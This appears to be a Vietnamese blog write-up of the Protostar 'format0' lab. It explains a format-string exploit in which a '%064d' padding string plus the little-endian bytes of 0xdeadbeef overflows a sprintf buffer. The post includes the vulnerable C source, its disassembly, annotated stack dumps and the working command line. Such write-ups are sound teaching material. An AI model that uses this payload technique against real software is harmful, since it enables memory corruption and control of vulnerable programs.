---
layout: post
title: format0
---

Trong bài này, chúng ta sẽ tìm hiểu một cách exploit mới dựa vào formatted string (chuỗi được định dạng). Formatted string được dùng khá nhiều trong C/C++ với các hàm như `printf` and `sprintf`. Các hàm này là kiểu hàm có số lượng tham số không cố định (variable arguments, hay varargs) và có thể thay đổi giá trị trên bộ nhớ, do đó, nếu không được dùng đúng cú pháp sẽ khiến bộ nhớ bị thay đổi trái với mong đợi và dẫn tới nhiều hậu quả.

Sau đây là source code và asm code của chương trình format0.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```
```asm
0x080483f4 <vuln+0>:    push   ebp
0x080483f5 <vuln+1>:    mov    ebp,esp
0x080483f7 <vuln+3>:    sub    esp,0x68
0x080483fa <vuln+6>:    mov    DWORD PTR [ebp-0xc],0x0
0x08048401 <vuln+13>:   mov    eax,DWORD PTR [ebp+0x8]
0x08048404 <vuln+16>:   mov    DWORD PTR [esp+0x4],eax
0x08048408 <vuln+20>:   lea    eax,[ebp-0x4c]
0x0804840b <vuln+23>:   mov    DWORD PTR [esp],eax
0x0804840e <vuln+26>:   call   0x8048300 <sprintf@plt>
0x08048413 <vuln+31>:   mov    eax,DWORD PTR [ebp-0xc]
0x08048416 <vuln+34>:   cmp    eax,0xdeadbeef
0x0804841b <vuln+39>:   jne    0x8048429 <vuln+53>
0x0804841d <vuln+41>:   mov    DWORD PTR [esp],0x8048510
0x08048424 <vuln+48>:   call   0x8048330 <puts@plt>
0x08048429 <vuln+53>:   leave
0x0804842a <vuln+54>:   ret
0x0804842b <main+0>:    push   ebp
0x0804842c <main+1>:    mov    ebp,esp
0x0804842e <main+3>:    and    esp,0xfffffff0
0x08048431 <main+6>:    sub    esp,0x10
0x08048434 <main+9>:    mov    eax,DWORD PTR [ebp+0xc]
0x08048437 <main+12>:   add    eax,0x4
0x0804843a <main+15>:   mov    eax,DWORD PTR [eax]
0x0804843c <main+17>:   mov    DWORD PTR [esp],eax
0x0804843f <main+20>:   call   0x80483f4 <vuln>
0x08048444 <main+25>:   leave
0x08048445 <main+26>:   ret
```

Hàm đầu tiên được xem xét trong bài này là `sprintf`. Hàm này có tham số đầu tiên là một biến (pointer), tiếp theo là một formatted string, theo sau đó là các tham số để thay vào formatted string. `sprintf` hoạt động bằng cách phân tích formatted string đưa vào, sau đó sinh ra một chuỗi mới sẽ được lưu vào biến tham số.

Tương tự như trong các bài về exploit stack trước đây.
1. Biến `target` được lưu trên stack với địa chỉ `ebp - 0xc`. Biến này có 4 byte.
2. Biến `buffer` được lưu trên stack với địa chỉ `ebp - 0x4c`. Biến này có 64 byte.

2 biến này lắm kề này trên stack. Do đó, về cơ bản, chúng ta sẽ cần một formatted string có thể sinh ra 68 byte, trong đó 4 byte cuối sẽ chứa giá trị mong muốn của `target`. Để exploit format0, formatted string sẽ như sau.

```bash
python -c "print '%064d\xef\xbe\xad\xde'"
```

Chuỗi sinh ra từ formatted string này sẽ gồm 64 ký tự như mong muốn (bản chất là dang số nguyên với các số 0 phía trước) và 4 byte cuối là 4 byte cần cho `target`.
Sau đây là bộ nhớ bắt đầu từ `esp`. Phân biệt theo màu <span style="color:springgreen">tham số sẽ dùng cho hàm sprintf</span>, <span style="color:aqua">buffer</span> và <span style="color:orangered">target</span>.

<pre class="memory">
0xbffff700:     <span style="color:springgreen">0xbffff71c</span>      <span style="color:springgreen">0xbffff978</span>      <span style="color:springgreen">0x080481e8</span>      0xbffff798
0xbffff710:     0xb7fffa54      0x00000000      0xb7fe1b28      <span style="color:aqua">0x00000001</span>
0xbffff720:     <span style="color:aqua">0x00000000</span>      <span style="color:aqua">0x00000001</span>      <span style="color:aqua">0xb7fff8f8</span>      <span style="color:aqua">0xb7f0186e</span>
0xbffff730:     <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0xb7ec6165</span>      <span style="color:aqua">0xbffff748</span>      <span style="color:aqua">0xb7eada75</span>
0xbffff740:     <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x08049624</span>      <span style="color:aqua">0xbffff758</span>      <span style="color:aqua">0x080482ec</span>
0xbffff750:     <span style="color:aqua">0xb7ff1040</span>      <span style="color:aqua">0x08049624</span>      <span style="color:aqua">0xbffff788</span>      <span style="color:orangered">0x00000000</span>
0xbffff760:     0xb7fd8304      0xb7fd7ff4      0xbffff788      0x08048444
</pre>

<pre class="memory">
0xbffff700:     <span style="color:springgreen">0xbffff71c</span>      <span style="color:springgreen">0xbffff978</span>      <span style="color:springgreen">0x080481e8</span>      0xbffff798
0xbffff710:     0xb7fffa54      0x00000000      0xb7fe1b28      <span style="color:aqua">0x30303030</span>
0xbffff720:     <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>
0xbffff730:     <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>
0xbffff740:     <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>
0xbffff750:     <span style="color:aqua">0x31303030</span>      <span style="color:aqua">0x31353433</span>      <span style="color:aqua">0x38323133</span>      <span style="color:orangered">0xdeadbeef</span>
0xbffff760:     0xb7fd8300      0xb7fd7ff4      0xbffff788      0x08048444
</pre>

Chúng ta đã sử dụng đến 3 tham số cho hàm `sprintf`. Tham số đầu tiên lưu tại `esp` là địa chỉ của biến `buffer`, tham số thứ 2 là địa chỉ của formatted string, và tham số thứ 3 là số dạng int sẽ được thay thế vào formatted string. Kiểm tra memory cho thấy sự trùng khớp giữa số int dạng byte là `0x080481e8` và số in ra dạng decimal có 0 phía trước sẽ là `0000000000000000000000000000000000000000000000000000000134513128`.

## Ref
```bash
user@protostar:~$ format0 $(python -c "print '%064d\xef\xbe\xad\xde'")
you have hit the target correctly :)
```
